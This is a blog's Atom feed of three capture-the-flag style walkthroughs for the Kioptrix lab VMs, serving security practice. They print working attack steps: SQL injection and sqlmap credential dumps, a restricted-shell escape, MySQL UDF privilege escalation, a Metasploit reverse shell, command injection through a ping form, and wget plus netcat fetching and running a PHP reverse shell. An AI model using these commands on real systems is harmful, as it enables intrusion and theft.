<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: hacking | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/hacking/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2014-06-26T00:20:43+03:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 4]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4/"/>
    <updated>2014-06-22T22:39:14+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4</id>
    <content type="html"><![CDATA[<p>This is the final vulnerable machine in the Kioptrix series. To set it up in VMware, create a new virtual machine with the advanced options and use existing virtual disk, pointing it at the Kioptrix 4 virtual disk.</p>

<!-- more -->


<p>Let&rsquo;s see what Nmap reveals:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.129</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-22 22:35 EEST
Nmap scan report for 192.168.127.129
Host is up (0.00074s latency).
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|<em>  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn&rsquo;t have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:1F:12:65 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 &ndash; 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>

<p>Host script results:
|<em>nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name:
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|</em>  System time: 2014-06-22T18:36:57-04:00
| smb-security-mode:
|   Account that was used for smb scripts: guest
|   User-level authentication
|   SMB Security: Challenge/response passwords supported
|<em>  Message signing disabled (dangerous, but default)
|</em>smbv2-enabled: Server doesn&rsquo;t support SMBv2 protocol
```</p>

<p>Again, this seems to be a web based challenge. Navigating to the target website shows this:</p>

<p><img class="center" src="/images/kio4.png" title="&lsquo;login&rsquo; &lsquo;login&rsquo;" ></p>

<p>Supplying a single quote in the password field gives an error, which nicely discloses the database end as being MySQL:</p>

<p><em>Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
Wrong Username or Password</em></p>

<p>Sqlmap to the rescue!</p>

<p>``` plain
sqlmap -u &ldquo;<a href="http://192.168.127.129/checklogin.php">http://192.168.127.129/checklogin.php</a>&rdquo; &mdash;dbms=MySQL &mdash;level=5 &mdash;risk=3 &mdash;data=&ldquo;myusername=admin&amp;mypassword=test&rdquo; &mdash;dump</p>

<p>Database: members
Table: members
[2 entries]
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| id | username | password              |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
| 1  | john     | MyNameIsJohn          |
| 2  | robert   | ADGAdsafdfwt4gadfga== |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
```</p>

<p>Logging in with these credentials didn&rsquo;t yield anything though, all I could see was a member&rsquo;s control panel with no functionality. So I remembered the previous challenge that allowed SSH access, and tried to log in:</p>

<p><code>plain
root@kali:~# ssh john@192.168.127.129
The authenticity of host '192.168.127.129 (192.168.127.129)' can't be established.
RSA key fingerprint is 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.127.129' (RSA) to the list of known hosts.
john@192.168.127.129's password:
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$
</code></p>

<p>Excellent! It&rsquo;s time for some sniffing around. This is not a normal shell, usual commands don&rsquo;t work, so let&rsquo;s see what&rsquo;s available with the help system.</p>

<p><code>plain
john:~$ help
cd  clear  echo  exit  help  ll  lpath  ls
</code></p>

<p>Hmm, not much. Actions are restricted too, can&rsquo;t <em>cd</em> to wherever I want:</p>

<p><code>plain
john:~$ cd /
*** forbidden path -&gt; "/"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
</code></p>

<p>So I googled for a bit, and it appears this shell is a Python based limited shell (<a href="https://github.com/ghantoos/lshell">https://github.com/ghantoos/lshell</a>):</p>

<blockquote><p>lshell is a shell coded in Python, that lets you restrict a user&rsquo;s environment to limited sets of commands, choose to enable/
disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user&rsquo;s commands, implement timing restriction, and more.</p></blockquote>

<p>It is possible to escape from this shell by leveraging the <em>echo</em> command to call <em>os.system</em> in order to spawn a shell: <code>echo os.system(&lsquo;/bin/bash&rsquo;)</code></p>

<p><code>plain
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
</code></p>

<p>Poking around, I found the following information in <code>/var/www/john/john.php</code>:</p>

<p><code>plain
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
</code></p>

<p>So, root doesn&rsquo;t have a password for MySQL? Let&rsquo;s check:</p>

<p>``` plain
john@Kioptrix4:/var/www/john$ mysql -u root -h localhost
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)</p>

<p>Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the buffer.
```</p>

<p><a href="http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/">Here</a> I have found a way to get root privileges from a MySQL server running as root. Here&rsquo;s a quick summary:</p>

<ul>
<li><p>It is possible to escalate from MySQL server root level to system root by using User Defined Functions (UDF)</p></li>
<li><p>We need the <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys.so</a> library that contains some useful functions that can interact with the OS. The most important ones are <strong>sys_exec</strong> (executes the command and returns the exit status) and <strong>sys_eval</strong> (executes the command and returns the standard output)</p></li>
</ul>


<p>The next step would be to find a way to get the library on the machine with our MySQL server. But that&rsquo;s not necessary in this case, because it&rsquo;s already on the server!</p>

<p><code>plain
john@Kioptrix4:~$ whereis lib_mysqludf_sys.so
lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so
</code></p>

<p>It took a bit of googling and trial and error until I found a way that worked in getting me to a root shell. <a href="http://superuser.com/questions/400723/how-do-i-create-a-superuser-from-the-command-line-in-ubuntu">Here</a> is a useful post. The relevant part for us is this:</p>

<blockquote><p>Until Ubuntu 11.10, the Unix group for administrators with root privileges through sudo had been admin. Starting with Ubuntu
12.04  LTS, it is now sudo, for compatibility with Debian and sudo itself. However, for backwards compatibility, admin group
members are still recognized as administrators</p></blockquote>

<p>So it is possible to make the john account to be part of the admin group, that is equivalent to the sudo group. So from the MySQL prompt, run this:</p>

<p><code>sql
SELECT sys_exec('usermod -a -G admin');
</code></p>

<p>What that does is it modifies john&rsquo;s account, appending it to the admin group. So let&rsquo;s do it on the MySQL command line:</p>

<p><code>sql
mysql&gt; select sys_exec('usermod -a -G admin john');
+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 |
+--------------------------------------+
1 row in set (0.11 sec)
</code></p>

<p>Now from john&rsquo;s shell:</p>

<p><code>plain
john@Kioptrix4:~$ sudo su
[sudo] password for john:
root@Kioptrix4:/home/john# whoami
root
</code></p>

<p>Awesome! We finally got root access! In root&rsquo;s directory there is another </code>congrats.txt</code> file that tells us there are at least 2 different tested ways to get root on this system. It sure was an interesting machine, and my favorite in the series, because it wasn&rsquo;t as straightforward as the others, and I had to look for more information and try (and fail) different approaches before I hit upon the winning one.</p>

<p>Here&rsquo;s today&rsquo;s fortune cookie:</p>

<blockquote><p>You single-handedly fought your way into this hopeless mess.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 3]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3/"/>
    <updated>2014-06-20T23:53:34+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/20/pentest-lab-kioptrix-level-3</id>
    <content type="html"><![CDATA[<p>Next in the Kioptrix series is level 3.</p>

<p><strong>Important</strong></p>

<p>With the VM there is a README.txt file that says you should update your hosts file with the VM&rsquo;s IP and hostname, which is <em>kioptrix3.com</em>. I initially ignored it and on the gallery page, all I could see were some broken images and links that didn&rsquo;t work. I went back and added the entry to my <code>/etc/hosts</code> file, and everything worked fine afterwards.</p>

<!-- more -->


<p>Start by checking out what&rsquo;s being exposed with Nmap:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.128</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-20 23:56 EEST
Nmap scan report for 192.168.127.128
Host is up (0.00039s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|<em>  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Ligoat Security &ndash; Got Goat? Security &hellip;
MAC Address: 00:0C:29:07:4F:A9 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 &ndash; 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```</p>

<p>Let&rsquo;s take a look at what&rsquo;s hosted on the web server. It appears to be a site with a blog page, a gallery and what appears to be an admin login page:</p>

<p><img class="center" src="/images/lotus_cms.png" title="&lsquo;admin login&rsquo; &lsquo;login&rsquo;" ></p>

<p>I tried running a sqlmap scan against it, with no success. Next, I thought maybe there might be something about the LotusCMS that powers up the site. It turns out there&rsquo;s a remote execution exploit available in Metasploit:</p>

<p><strong>LotusCMS 3.0 eval() Remote Command Execution</strong></p>

<blockquote><p>This module exploits a vulnerability found in Lotus CMS 3.0&rsquo;s Router() function. This is done by embedding PHP code in the &lsquo;page&rsquo; parameter,
which will be passed to a eval call, therefore allowing remote code execution. The module can either automatically pick up a &lsquo;page&rsquo; parameter
from the default page, or manually specify one in the URI option. To use the automatic method, please supply the URI with just a directory path, > for example: &ldquo;/lcms/&rdquo;. To manually configure one, you may do: &ldquo;/lcms/somepath/index.php?page=index&rdquo;</p></blockquote>

<p>``` plain
msf > use exploit/multi/http/lcms_php_exec
msf exploit(lcms_php_exec) > show options</p>

<p>Module options (exploit/multi/http/lcms_php_exec):</p>

<p>   Name     Current Setting  Required  Description</p>

<hr />

<p>   Proxies                   no        Use a proxy chain
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   URI      /lcms/           yes       URI
   VHOST                     no        HTTP server virtual host</p>

<p>Exploit target:</p>

<p>   Id  Name</p>

<hr />

<p>   0   Automatic LotusCMS 3.0</p>

<p>msf exploit(lcms_php_exec) > set RHOST 192.168.127.128
RHOST => 192.168.127.128
msf exploit(lcms_php_exec) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf exploit(lcms_php_exec) > set LHOST 192.168.127.159
LHOST => 192.168.127.159
msf exploit(lcms_php_exec) > set URI /
URI => /
msf exploit(lcms_php_exec) > exploit</p>

<p>[<em>] Started reverse handler on 192.168.127.159:4444
[</em>] Using found page param: /index.php?page=index
[<em>] Sending exploit &hellip;
[</em>] Command shell session 1 opened (192.168.127.159:4444 &ndash;> 192.168.127.128:40623) at 2014-06-22 00:37:23 +0300
whoami</p>

<p>www-data
```</p>

<p>So we have a shell. I could not find a local privilege escalation exploit right away, so I instead started exploring the system.</p>

<p><code>plain
pwd
/home/www/kioptrix3.com
ls -l
total 84
drwxrwxrwx  2 root root  4096 Apr 15  2011 cache
drwxrwxrwx  8 root root  4096 Apr 14  2011 core
drwxrwxrwx  8 root root  4096 Apr 14  2011 data
-rw-r--r--  1 root root 23126 Jun  5  2009 favicon.ico
drwxr-xr-x  7 root root  4096 Apr 14  2011 gallery
-rw-r--r--  1 root root 26430 Jan 21  2007 gnu-lgpl.txt
-rw-r--r--  1 root root   399 Feb 23  2011 index.php
drwxrwxrwx 10 root root  4096 Apr 14  2011 modules
drwxrwxrwx  3 root root  4096 Apr 14  2011 style
-rw-r--r--  1 root root   243 Aug  5  2010 update.php
</code></p>

<p>The gallery directory looks interesting, so I looked inside:</p>

<p><code>plain
cd gallery
ls -l
total 156
drwxr-xr-x 2 root root  4096 Apr 12  2011 BACK
-rw-r--r-- 1 root root  3573 Oct 10  2009 db.sql
-rw-r--r-- 1 root root   252 Apr 12  2011 g.php
drwxr-xr-x 3 root root  4096 Apr 12  2011 gadmin
-rw-r--r-- 1 root root   214 Apr 12  2011 gallery.php
-rw-r--r-- 1 root root  1440 Apr 14  2011 gconfig.php
-rw-r--r-- 1 root root   297 Apr 12  2011 gfooter.php
-rw-r--r-- 1 root root 38771 Apr 12  2011 gfunctions.php
-rw-r--r-- 1 root root  1009 Apr 12  2011 gheader.php
-rw-r--r-- 1 root root   249 Apr 12  2011 index.php
-rw-r--r-- 1 root root 10340 Apr 12  2011 install.BAK
-rw-r--r-- 1 root root   212 Apr 12  2011 login.php
-rw-r--r-- 1 root root   213 Apr 12  2011 logout.php
-rw-r--r-- 1 root root   249 Apr 12  2011 p.php
drwxrwxrwx 2 root root  4096 Apr 12  2011 photos
-rw-r--r-- 1 root root   213 Apr 12  2011 photos.php
-rw-r--r-- 1 root root   219 Apr 12  2011 post_comment.php
-rw-r--r-- 1 root root   214 Apr 12  2011 profile.php
-rw-r--r-- 1 root root    87 Oct 10  2009 readme.html
-rw-r--r-- 1 root root   213 Apr 12  2011 recent.php
-rw-r--r-- 1 root root   215 Apr 12  2011 register.php
drwxr-xr-x 2 root root  4096 Apr 13  2011 scopbin
-rw-r--r-- 1 root root   213 Apr 12  2011 search.php
-rw-r--r-- 1 root root   216 Apr 12  2011 slideshow.php
-rw-r--r-- 1 root root   211 Apr 12  2011 tags.php
drwxr-xr-x 6 root root  4096 Apr 12  2011 themes
-rw-r--r-- 1 root root    56 Oct 10  2009 version.txt
-rw-r--r-- 1 root root   211 Apr 12  2011 vote.php
</code></p>

<p>So, there&rsquo;s all the source code for the gallery. I checked the files that looked interesting until I came upon a hit on the <code>gconfig.php</code> file, which contains the sort of information we need:</p>

<p>``` plain
/*</p>

<pre><code>A sample Gallarific configuration file. You should edit
the installer details below and save this file as gconfig.php
Do not modify anything else if you don't know what it is.
</code></pre>

<p>*/</p>

<pre><code>$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

$GLOBALS["gallarific_mysql_server"] = "localhost";
$GLOBALS["gallarific_mysql_database"] = "gallery";
$GLOBALS["gallarific_mysql_username"] = "root";
$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
</code></pre>

<p>```</p>

<p>I tried SSHing to the box with these credentials and also elevating privileges with su, but that would have been too easy. So more digging in the Php source code. The <code>gfunctions.php</code> file contains a plethora of information, among which there are some table and column names. There might be more information in the Php files but I didn&rsquo;t have the patience to go through all of them.</p>

<p>Back at the gallery, we can see some sorting options:</p>

<p><img class="center" src="/images/sort.png" title="&lsquo;sort options&rsquo; &lsquo;sort&rsquo;" ></p>

<p>Changing the sort filter to <em>photo id</em> makes the URL look like this:</p>

<p><code><a href="http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos">http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</a></code></p>

<p>And if I replace the <code>id=1</code> part with <code>id=&lsquo;</code>, the site spits back a SQL error:</p>

<p><em>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;&rsquo; order by parentid,sort,name' at line 1Could not select category</em></p>

<p>Now that I know SQLi is possible, it&rsquo;s time to fire sqlmap again!</p>

<p>``` plain
sqlmap -u &ldquo;<a href="http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos">http://kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</a>&rdquo; &mdash;dbms=MySQL &mdash;level=5 &mdash;risk=3 &mdash;dump</p>

<p>Database: gallery
Table: dev_accounts
[2 entries]
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| id | username   | password                         |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>

<p>```</p>

<p>It was a bit overkill to dump so much information, but I only show here the important bits. To crack the hashes, I used the <a href="http://www.hashkiller.co.uk/">http://www.hashkiller.co.uk/</a> site:</p>

<p>dreg&rsquo;s password: Mast3r</p>

<p>loneferret&rsquo;s password: starwars</p>

<p>Thankfully, these credentials work for SSH login, so I could get rid of the Metasploit shell which kept throwing EOF errors if I didn&rsquo;t interact with it for a while.</p>

<p>``` plain
ssh <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#111;&#58;&#x6c;&#111;&#x6e;&#101;&#x66;&#101;&#114;&#114;&#x65;&#x74;&#64;&#107;&#105;&#111;&#112;&#x74;&#x72;&#x69;&#x78;&#x33;&#46;&#x63;&#111;&#x6d;">&#x6c;&#x6f;&#x6e;&#101;&#x66;&#101;&#x72;&#114;&#101;&#116;&#64;&#107;&#105;&#111;&#112;&#x74;&#x72;&#105;&#x78;&#x33;&#x2e;&#x63;&#111;&#109;</a>
The authenticity of host &lsquo;kioptrix3.com (192.168.127.128)&rsquo; can&rsquo;t be established.
RSA key fingerprint is 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &lsquo;kioptrix3.com&rsquo; (RSA) to the list of known hosts.
<a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#108;&#x6f;&#x6e;&#101;&#102;&#x65;&#x72;&#114;&#x65;&#x74;&#64;&#x6b;&#x69;&#111;&#112;&#116;&#x72;&#105;&#x78;&#51;&#x2e;&#x63;&#111;&#x6d;">&#x6c;&#111;&#x6e;&#101;&#x66;&#101;&#x72;&#x72;&#x65;&#116;&#x40;&#x6b;&#x69;&#x6f;&#x70;&#x74;&#114;&#x69;&#120;&#51;&#x2e;&#99;&#111;&#109;</a>&rsquo;s password:
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</p>

<p>The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.</p>

<p>To access official Ubuntu documentation, please visit:
<a href="http://help.ubuntu.com/">http://help.ubuntu.com/</a>
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$
```</p>

<p>In the home directory there&rsquo;s a <code>CompanyPolicy.README</code> file with the following:</p>

<p>``` plain
 Hello new employee,
 It is company policy here to use our newly installed software for editing, creating and viewing files.
 Please use the command &lsquo;sudo ht&rsquo;.
 Failure to do so will result in you immediate termination.</p>

<p> DG
 CEO
```</p>

<p>So, let&rsquo;s see what this ht program is all about:</p>

<p><code>plain
loneferret@Kioptrix3:~$ whereis ht
ht: /usr/local/bin/ht
loneferret@Kioptrix3:~$ ls -l /usr/local/bin/ht
-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht
</code></p>

<p>Looks like a SUID binary! And it seems it&rsquo;s a hex editor that we can use to view and edit any file on the system!</p>

<p><img class="center" src="/images/ht.png" title="&lsquo;ht&rsquo; &lsquo;ht&rsquo;" ></p>

<p>Ok, I could crack the root password, but there&rsquo;s an easier way, by modifing the <code>/etc/sudoers</code> file. First, I had to look up some information about the ht editor. You need to use the F (function) keys for this one. With F6, I could change the mode to text, making it look less horrible. The easiest way I found to go about it was to open the <code>/etc/sudoers</code> file again, after selecting the text mode. Then I added <em>/bin/bas</em> to loneferret&rsquo;s entry:</p>

<p><img class="center" src="/images/sudo_bash.png" title="&lsquo;sudo bash&rsquo; &lsquo;sudo bash&rsquo;" ></p>

<p>Now save the file and type <em>sudo bash</em> to get the long waited for root shell. In the /root/ directory there&rsquo;s also a <code>Congrats.txt</code> file:</p>

<p>``` plain
root@Kioptrix3:/root# cat Congrats.txt
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn&rsquo;t that bad now was it.</p>

<p>Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone.
Difficulty is relative, keep that in mind.</p>

<p>The object is to learn, do some research and have a little (legal)
fun in the process.</p>

<p>I hope you enjoyed this third challenge.</p>

<p>Steven McElrea
aka loneferret
<a href="http://www.kioptrix.com">http://www.kioptrix.com</a></p>

<p>Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.</p>

<p>Main page CMS:
<a href="http://www.lotuscms.org">http://www.lotuscms.org</a></p>

<p>Gallery application:
Gallarific 2.1 &ndash; Free Version released October 10, 2009
<a href="http://www.gallarific.com">http://www.gallarific.com</a>
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
<a href="http://www.exploit-db.com/exploits/15891/">http://www.exploit-db.com/exploits/15891/</a></p>

<p>The HT Editor can be found here:
<a href="http://hte.sourceforge.net/downloads.html">http://hte.sourceforge.net/downloads.html</a>
And the vulnerable version on Exploit-DB here:
<a href="http://www.exploit-db.com/exploits/17083/">http://www.exploit-db.com/exploits/17083/</a></p>

<p>Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```</p>

<p>And this was Kioptrix level 3, with another interesting twist.</p>

<blockquote><p>Today is the tomorrow you worried about yesterday.</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 2]]></title>
    <link href="http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2/"/>
    <updated>2014-06-16T22:47:31+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/06/16/pentest-lab-kioptrix-level-2</id>
    <content type="html"><![CDATA[<p>Today I will walk through exploiting level 2 in the Kioptrix series.</p>

<!-- more -->


<p>Again, I first did a ping sweep with Nmap and determined the IP of the target is 192.168.127.162</p>

<p>Next, the port scan:</p>

<p>``` plain
nmap -A -p1-65535 192.168.127.162</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-06-16 22:52 EEST
Nmap scan report for 192.168.127.162
Host is up (0.00036s latency).
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|<em>ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|</em>sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|<em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|</em>http-title: Site doesn&rsquo;t have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            630/udp  status
|<em>  100024  1            633/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|</em>http-methods: No Allow or Public header in OPTIONS response (status code 200)
|<em>http-title: Site doesn&rsquo;t have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=&mdash;
| Not valid before: 2009-10-07T23:10:47+00:00
|</em>Not valid after:  2010-10-07T23:10:47+00:00
|<em>ssl-date: 2014-06-16T16:42:47+00:00; -3h09m46s from local time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_CBC_128_CBC_WITH_MD5
|</em>    SSL2_RC4_128_EXPORT40_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods: Potentially risky methods: PUT
|<em>See <a href="http://nmap.org/nsedoc/scripts/http-methods.html">http://nmap.org/nsedoc/scripts/http-methods.html</a>
|</em>http-title: 403 Forbidden
633/tcp  open  status   1 (RPC #100024)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            630/udp  status
|_  100024  1            633/tcp  status
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:20:9D:3E (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 &ndash; 2.6.30
```</p>

<h3>From web to shell</h3>

<p>Pointing the browser to the target, we can see this remote admin login panel:</p>

<p><img class="center" src="/images/login.png" title="&lsquo;admin login&rsquo; &lsquo;login&rsquo;" ></p>

<p>Immediately thinking SQL injection, I did a quick scan with Owasp Zap and indeed, the login can be bypassed using an injection like the following:</p>

<p><code>&lsquo; or '1&rsquo; = &lsquo;1&rsquo; &mdash; </code></p>

<p>Now we can see an interface where we can ping hosts, which might mean remote code execution:</p>

<p><img class="center" src="/images/ping.png" title="&lsquo;ping ip&rsquo; &lsquo;ping&rsquo;" ></p>

<p>After testing the ping functionality, I ran a quick <em>uname -a</em> to confirm that remote code execution is possible:</p>

<p>``` plain
; uname -a</p>

<p>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
```</p>

<p>The semicolon is used to run multiple commands, so in this case I am closing the ping command and inputting another one after it. I tried poking around, checking if I can read /etc/shadow (which I can&rsquo;t, only /etc/passwd). The commands are ran by the <strong>apache</strong> user. So I&rsquo;m thinking, it&rsquo;s time for some PHP backdoor fun! I found some on Kali in <code>/usr/share/webshells/php</code></p>

<p>First, I&rsquo;m going to copy the reverse PHP shell to my home directory and rename it:</p>

<p><code>plain
cp php-reverse-shell.php ~/shell.php
</code></p>

<p>Let&rsquo;s see the description:</p>

<blockquote><p>This script will make an outbound TCP connection to a hardcoded IP and port.
The recipient will be given a shell running as the current user (apache normally).</p></blockquote>

<p>Next I looked at the Php code, and I need to change the IP and port. The IP is the address of the attacker machine, and for the port I just threw 80 in there, since an outbound connection to port 80 is guaranteed to be allowed (if there was a firewall in place).</p>

<p>With that done, the next step is to serve the shell on my machine and use the web interface to download it to the target host.</p>

<p>On my machine:</p>

<p><code>plain
nc -v -l -p 80 &lt; shell.php
</code></p>

<p>On the web interface:</p>

<p>``` plain
; wget 192.168.127.159:80 -O /tmp/puppies.php</p>

<p>; ls /tmp</p>

<p>puppies.php
```</p>

<p>Now listen on my machine for the incoming connection:</p>

<p><code>plain
nc -v -l -p 80
</code></p>

<p>And on the web interface, execute the shell:</p>

<p><code>plain
; php /tmp/puppies.php
</code></p>

<p>And we have a shell!</p>

<p><code>plain
nc: connect to 192.168.127.159 80 from 192.168.127.162 (192.168.127.162) 32772 [32772]
